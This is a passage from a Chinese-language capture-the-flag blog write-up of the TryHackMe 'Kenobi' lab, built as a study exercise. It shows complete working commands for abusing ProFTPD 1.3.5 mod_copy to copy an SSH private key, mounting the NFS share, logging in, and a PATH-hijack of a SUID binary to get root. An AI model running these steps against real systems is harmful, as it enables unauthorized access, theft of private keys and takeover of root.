</span></span><span class="line"><span class="cl"><span class="p">|</span> rwxr-xr-x   <span class="m">0</span>    <span class="m">0</span>    <span class="m">4096</span>  2019-09-04T12:09:49  backups
</span></span><span class="line"><span class="cl"><span class="p">|</span> rwxr-xr-x   <span class="m">0</span>    <span class="m">0</span>    <span class="m">4096</span>  2019-09-04T10:37:44  cache
</span></span><span class="line"><span class="cl"><span class="p">|</span> rwxrwxrwx   <span class="m">0</span>    <span class="m">0</span>    <span class="m">4096</span>  2019-09-04T08:43:56  crash
</span></span><span class="line"><span class="cl"><span class="p">|</span> rwxrwsr-x   <span class="m">0</span>    <span class="m">50</span>   <span class="m">4096</span>  2016-04-12T20:14:23  <span class="nb">local</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> rwxrwxrwx   <span class="m">0</span>    <span class="m">0</span>    <span class="m">9</span>     2019-09-04T08:41:33  lock
</span></span><span class="line"><span class="cl"><span class="p">|</span> rwxrwxr-x   <span class="m">0</span>    <span class="m">108</span>  <span class="m">4096</span>  2019-09-04T10:37:44  log
</span></span><span class="line"><span class="cl"><span class="p">|</span> rwxr-xr-x   <span class="m">0</span>    <span class="m">0</span>    <span class="m">4096</span>  2019-01-29T23:27:41  snap
</span></span><span class="line"><span class="cl"><span class="p">|</span> rwxr-xr-x   <span class="m">0</span>    <span class="m">0</span>    <span class="m">4096</span>  2019-09-04T08:53:24  www
</span></span><span class="line"><span class="cl"><span class="p">|</span>_
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 8.97 seconds
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="gain-initial-access-with-proftpd">Gain initial access with ProFtpd</h2>
<h3 id="what-is-the-version">What is the version?</h3>
<p>前面服务扫描的时候已经获得，1.3.5</p>
<h3 id="how-many-exploits-are-there-for-the-proftpd-running">How many exploits are there for the ProFTPd running?</h3>
<p>使用searchsploit搜索一下相关的exp数量：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tmp<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ searchsploit ProFtpd <span class="p">|</span>grep 1.3.5
</span></span><span class="line"><span class="cl">ProFTPd 1.3.5 - File Copy                                                                                                                <span class="p">|</span> linux/remote/36742.txt
</span></span><span class="line"><span class="cl">ProFTPd 1.3.5 - <span class="s1">&#39;mod_copy&#39;</span> Command Execution <span class="o">(</span>Metasploit<span class="o">)</span>                                                                                <span class="p">|</span> linux/remote/37262.rb
</span></span><span class="line"><span class="cl">ProFTPd 1.3.5 - <span class="s1">&#39;mod_copy&#39;</span> Remote Command Execution <span class="o">(</span>2<span class="o">)</span>                                                                                  <span class="p">|</span> linux/remote/49908.py
</span></span><span class="line"><span class="cl">ProFTPd 1.3.5 - <span class="s1">&#39;mod_copy&#39;</span> Remote Command Execution                                                                                      <span class="p">|</span> linux/remote/36803.py
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="what-is-kenobis-user-flag-homekenobiusertxt">What is Kenobi&rsquo;s user flag (/home/kenobi/user.txt)?</h3>
<p>The mod_copy module implements <strong>SITE CPFR</strong> and <strong>SITE CPTO</strong> commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.</p>
<p>We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user.</p>
<p>利用SITE CPFR 和 SITE CPTO实现文件copy，copy位置是挂载的/var路径：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tmp<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ nc 10.10.46.200 <span class="m">21</span>
</span></span><span class="line"><span class="cl"><span class="m">220</span> ProFTPD 1.3.5 Server <span class="o">(</span>ProFTPD Default Installation<span class="o">)</span> <span class="o">[</span>10.10.46.200<span class="o">]</span>
</span></span><span class="line"><span class="cl">SITE CPFR /home/kenobi/.ssh/id_rsa
</span></span><span class="line"><span class="cl"><span class="m">350</span> File or directory exists, ready <span class="k">for</span> destination name
</span></span><span class="line"><span class="cl">SITE CPTO /var/tmp/id_rsa
</span></span><span class="line"><span class="cl"><span class="m">250</span> Copy successful
</span></span></code></pre></td></tr></table>
</div>
</div><p>We knew that the /var directory was a mount we could see. So we&rsquo;ve now moved Kenobi&rsquo;s private key to the /var/tmp directory.</p>
<p>把/var/tmp挂载到我们自己的机器上：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tmp<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ mkdir /mnt/kenobiNFS
</span></span><span class="line"><span class="cl">mkdir: cannot create directory ‘/mnt/kenobiNFS’: Permission denied
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tmp<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ sudo mmkdir /mnt/kenobiNFS
</span></span><span class="line"><span class="cl">sudo: mmkdir: <span class="nb">command</span> not found
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tmp<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ sudo mkdir /mnt/kenobiNFS
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tmp<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ <span class="nb">cd</span> /mnt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>/mnt<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ ls
</span></span><span class="line"><span class="cl">ls: cannot access <span class="s1">&#39;hgfs&#39;</span>: Input/output error
</span></span><span class="line"><span class="cl">hgfs  kenobiNFS
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>/mnt<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ sudo mount 10.10.46.200:/var/tmp /mnt/kenobiNFS
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>/mnt<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ ls -la /mnt/kenobiNFS
</span></span><span class="line"><span class="cl">total <span class="m">28</span>
</span></span><span class="line"><span class="cl">drwxrwxrwt <span class="m">6</span> root     root     <span class="m">4096</span> Mar  <span class="m">5</span> 22:39 .
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">4</span> root     root     <span class="m">4096</span> Mar  <span class="m">5</span> 22:41 ..
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> v4ler1an v4ler1an <span class="m">1675</span> Mar  <span class="m">5</span> 22:39 id_rsa
</span></span><span class="line"><span class="cl">drwx------ <span class="m">3</span> root     root     <span class="m">4096</span> Sep  <span class="m">4</span>  <span class="m">2019</span> systemd-private-2408059707bc41329243d2fc9e613f1e-systemd-timesyncd.service-a5PktM
</span></span><span class="line"><span class="cl">drwx------ <span class="m">3</span> root     root     <span class="m">4096</span> Sep  <span class="m">4</span>  <span class="m">2019</span> systemd-private-6f4acd341c0b40569c92cee906c3edc9-systemd-timesyncd.service-z5o4Aw
</span></span><span class="line"><span class="cl">drwx------ <span class="m">3</span> root     root     <span class="m">4096</span> Sep  <span class="m">4</span>  <span class="m">2019</span> systemd-private-e69bbb0653ce4ee3bd9ae0d93d2a5806-systemd-timesyncd.service-zObUdn
</span></span><span class="line"><span class="cl">drwx------ <span class="m">3</span> root     root     <span class="m">4096</span> Mar  <span class="m">5</span> 22:12 systemd-private-ee05fedf0dd847fabad553360be89561-systemd-timesyncd.service-0uazTq
</span></span></code></pre></td></tr></table>
</div>
</div><p>此时可以拿到id_rsa文件，我们就用这个文件去远程连接ssh：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>/mnt<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ cp /mnt/kenobiNFS/id_rsa ~/Documents/tmp/id_rsa
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>/mnt<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ <span class="nb">cd</span> ~/Documents/tmp/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tmp<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ chmod <span class="m">600</span> id_rsa
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tmp<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ ssh -i ./id_rsa kenobi@10.10.46.200
</span></span><span class="line"><span class="cl">The authenticity of host <span class="s1">&#39;10.10.46.200 (10.10.46.200)&#39;</span> can<span class="s1">&#39;t be established.
</span></span></span><span class="line"><span class="cl"><span class="s1">ED25519 key fingerprint is SHA256:GXu1mgqL0Wk2ZHPmEUVIS0hvusx4hk33iTcwNKPktFw.
</span></span></span><span class="line"><span class="cl"><span class="s1">This key is not known by any other names.
</span></span></span><span class="line"><span class="cl"><span class="s1">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
</span></span></span><span class="line"><span class="cl"><span class="s1">Warning: Permanently added &#39;</span>10.10.46.200<span class="err">&#39;</span> <span class="o">(</span>ED25519<span class="o">)</span> to the list of known hosts.
</span></span><span class="line"><span class="cl">Welcome to Ubuntu 16.04.6 LTS <span class="o">(</span>GNU/Linux 4.8.0-58-generic x86_64<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> * Documentation:  https://help.ubuntu.com
</span></span><span class="line"><span class="cl"> * Management:     https://landscape.canonical.com
</span></span><span class="line"><span class="cl"> * Support:        https://ubuntu.com/advantage
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="m">103</span> packages can be updated.
</span></span><span class="line"><span class="cl"><span class="m">65</span> updates are security updates.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Last login: Wed Sep  <span class="m">4</span> 07:10:15 <span class="m">2019</span> from 192.168.1.147
</span></span><span class="line"><span class="cl">To run a <span class="nb">command</span> as administrator <span class="o">(</span>user <span class="s2">&#34;root&#34;</span><span class="o">)</span>, use <span class="s2">&#34;sudo &lt;command&gt;&#34;</span>.
</span></span><span class="line"><span class="cl">See <span class="s2">&#34;man sudo_root&#34;</span> <span class="k">for</span> details.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">kenobi@kenobi:~$ ls
</span></span><span class="line"><span class="cl">share  user.txt
</span></span><span class="line"><span class="cl">kenobi@kenobi:~$ cat user.txt
</span></span><span class="line"><span class="cl">d0b0f3f53b6caa532a83915e19224899
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="privilege-escalation-with-path-variable-manipulation">Privilege Escalation with Path Variable Manipulation</h2>
<h3 id="what-file-looks-particularly-out-of-the-ordinary">What file looks particularly out of the ordinary?</h3>
<p>检查SUID文件：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">kenobi@kenobi:~$ find / -perm -4000 -type f -exec ls -la <span class="o">{}</span> 2&gt;/dev/null <span class="se">\;</span>
</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">94240</span> May  <span class="m">8</span>  <span class="m">2019</span> /sbin/mount.nfs
</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">14864</span> Jan <span class="m">15</span>  <span class="m">2019</span> /usr/lib/policykit-1/polkit-agent-helper-1
</span></span><span class="line"><span class="cl">-rwsr-xr-- <span class="m">1</span> root messagebus <span class="m">42992</span> Jan <span class="m">12</span>  <span class="m">2017</span> /usr/lib/dbus-1.0/dbus-daemon-launch-helper
</span></span><span class="line"><span class="cl">-rwsr-sr-x <span class="m">1</span> root root <span class="m">98440</span> Jan <span class="m">29</span>  <span class="m">2019</span> /usr/lib/snapd/snap-confine
</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">10232</span> Mar <span class="m">27</span>  <span class="m">2017</span> /usr/lib/eject/dmcrypt-get-device
</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">428240</span> Jan <span class="m">31</span>  <span class="m">2019</span> /usr/lib/openssh/ssh-keysign
</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">38984</span> Jun <span class="m">14</span>  <span class="m">2017</span> /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">49584</span> May <span class="m">16</span>  <span class="m">2017</span> /usr/bin/chfn
</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">32944</span> May <span class="m">16</span>  <span class="m">2017</span> /usr/bin/newgidmap
</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">23376</span> Jan <span class="m">15</span>  <span class="m">2019</span> /usr/bin/pkexec
</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">54256</span> May <span class="m">16</span>  <span class="m">2017</span> /usr/bin/passwd
</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">32944</span> May <span class="m">16</span>  <span class="m">2017</span> /usr/bin/newuidmap
</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">75304</span> May <span class="m">16</span>  <span class="m">2017</span> /usr/bin/gpasswd
</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">8880</span> Sep  <span class="m">4</span>  <span class="m">2019</span> /usr/bin/menu
</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">136808</span> Jul  <span class="m">4</span>  <span class="m">2017</span> /usr/bin/sudo
</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">40432</span> May <span class="m">16</span>  <span class="m">2017</span> /usr/bin/chsh
</span></span><span class="line"><span class="cl">-rwsr-sr-x <span class="m">1</span> daemon daemon <span class="m">51464</span> Jan <span class="m">14</span>  <span class="m">2016</span> /usr/bin/at
</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">39904</span> May <span class="m">16</span>  <span class="m">2017</span> /usr/bin/newgrp
</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">27608</span> May <span class="m">16</span>  <span class="m">2018</span> /bin/umount
</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">30800</span> Jul <span class="m">12</span>  <span class="m">2016</span> /bin/fusermount
</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">40152</span> May <span class="m">16</span>  <span class="m">2018</span> /bin/mount
</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">44168</span> May  <span class="m">7</span>  <span class="m">2014</span> /bin/ping
</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">40128</span> May <span class="m">16</span>  <span class="m">2017</span> /bin/su
</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">44680</span> May  <span class="m">7</span>  <span class="m">2014</span> /bin/ping6
</span></span></code></pre></td></tr></table>
</div>
</div><p>这里的可疑文件就是<code>/usr/bin/menu</code>，没有发现其他能利用的SUID的程序。</p>
<h3 id="run-the-binary-how-many-options-appear">Run the binary, how many options appear?</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-SHELL" data-lang="SHELL"><span class="line"><span class="cl">kenobi@kenobi:~$ /usr/bin/menu
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">***************************************
</span></span><span class="line"><span class="cl">1. status check
</span></span><span class="line"><span class="cl">2. kernel version
</span></span><span class="line"><span class="cl">3. ifconfig
</span></span><span class="line"><span class="cl">** Enter your choice :1
</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">200</span> OK
</span></span><span class="line"><span class="cl">Date: Wed, <span class="m">06</span> Mar <span class="m">2024</span> 03:50:41 GMT
</span></span><span class="line"><span class="cl">Server: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl">Last-Modified: Wed, <span class="m">04</span> Sep <span class="m">2019</span> 09:07:20 GMT
</span></span><span class="line"><span class="cl">ETag: <span class="s2">&#34;c8-591b6884b6ed2&#34;</span>
</span></span><span class="line"><span class="cl">Accept-Ranges: bytes
</span></span><span class="line"><span class="cl">Content-Length: <span class="m">200</span>
</span></span><span class="line"><span class="cl">Vary: Accept-Encoding
</span></span><span class="line"><span class="cl">Content-Type: text/html
</span></span></code></pre></td></tr></table>
</div>
</div><p>选项1好像做了一个web请求。</p>
<p>使用strings查看menu中包含的明文字符串：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">... ..
</span></span><span class="line"><span class="cl">2. kernel version
</span></span><span class="line"><span class="cl">3. ifconfig
</span></span><span class="line"><span class="cl">** Enter your choice :
</span></span><span class="line"><span class="cl">curl -I localhost
</span></span><span class="line"><span class="cl">uname -r
</span></span><span class="line"><span class="cl">ifconfig
</span></span><span class="line"><span class="cl"> Invalid choice
</span></span><span class="line"><span class="cl">... ...
</span></span></code></pre></td></tr></table>
</div>
</div><p>发现它会调用<code>curl</code>程序，该程序属性如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">kenobi@kenobi:~$ which curl
</span></span><span class="line"><span class="cl">/usr/bin/curl
</span></span><span class="line"><span class="cl">kenobi@kenobi:~$ ll /usr/bin/curl
</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root <span class="m">190408</span> Jan <span class="m">29</span>  <span class="m">2019</span> /usr/bin/curl*
</span></span></code></pre></td></tr></table>
</div>
</div><p>那我们这里的思路就是在当前的shell中添加一个环境变量，在新添加的环境变量中为在一个curl程序，让他去调用bash或者sh。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">kenobi@kenobi:~$ <span class="nb">cd</span> /tmp
</span></span><span class="line"><span class="cl">kenobi@kenobi:/tmp$ <span class="nb">echo</span> /bin/sh &gt; curl				--&gt; 在/tmp下伪造一个curl
</span></span><span class="line"><span class="cl">kenobi@kenobi:/tmp$ chmod <span class="m">777</span> curl						--&gt; 修改一下权限
</span></span><span class="line"><span class="cl">kenobi@kenobi:/tmp$ <span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>	  --&gt; 修改PATH环境变量，/tmp路径放在最前面
</span></span></code></pre></td></tr></table>
</div>
</div><p>最后，我们在当前环境变量下去调用menu，让它去调用伪造的curl：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">kenobi@kenobi:/tmp$ /usr/bin/menu
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">***************************************
</span></span><span class="line"><span class="cl">1. status check
</span></span><span class="line"><span class="cl">2. kernel version
</span></span><span class="line"><span class="cl">3. ifconfig
</span></span><span class="line"><span class="cl">** Enter your choice :1
</span></span><span class="line"><span class="cl"><span class="c1"># id</span>
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>kenobi<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>kenobi<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,27<span class="o">(</span>sudo<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,110<span class="o">(</span>lxd<span class="o">)</span>,113<span class="o">(</span>lpadmin<span class="o">)</span>,114<span class="o">(</span>sambashare<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># cat /root/root.txt</span>
</span></span><span class="line"><span class="cl">177b3cd8562289f37382721c28381f02
</span></span></code></pre></td></tr></table>
</div>
</div></div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>更新于 2024-01-03</span>
            </div>
            <div class="post-info-license"></div>
        </div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="https://www.v4ler1an.com/2024/01/thm-kenobi/" data-title="TryHackMe -- Kenobi" data-via="@YaoyaoShaw" data-hashtags="THM"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="https://www.v4ler1an.com/2024/01/thm-kenobi/" data-hashtag="THM"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Hacker News" data-sharer="hackernews" data-url="https://www.v4ler1an.com/2024/01/thm-kenobi/" data-title="TryHackMe -- Kenobi"><i class="fab fa-hacker-news fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="https://www.v4ler1an.com/2024/01/thm-kenobi/" data-title="TryHackMe -- Kenobi"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@2.14.0/icons/line.svg"></i></a><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://www.v4ler1an.com/2024/01/thm-kenobi/" data-title="TryHackMe -- Kenobi"><i class="fab fa-weibo fa-fw"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/thm/">THM</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/2024/01/thm-vulnversity/" class="prev" rel="prev" title="TryHackMe -- Vulnversity"><i class="fas fa-angle-left fa-fw"></i>TryHackMe -- Vulnversity</a>
            <a href="/2024/01/thm-steal_mountain/" class="next" rel="next" title="TryHackMe -- Steal Mountain">TryHackMe -- Steal Mountain<i class="fas fa-angle-right fa-fw"></i></a></div>
</div>
<div id="comments"><div id="disqus_thread" class="comment"></div><noscript>
                Please enable JavaScript to view the comments powered by <a href="https://disqus.com/?ref_noscript">Disqus</a>.
            </noscript><div id="valine" class="comment"></div><noscript>
                Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
            </noscript></div></article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">Something just like this.</div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2021 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://www.v4ler1an.com" target="_blank"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
                <i class="fas fa-arrow-up fa-fw"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
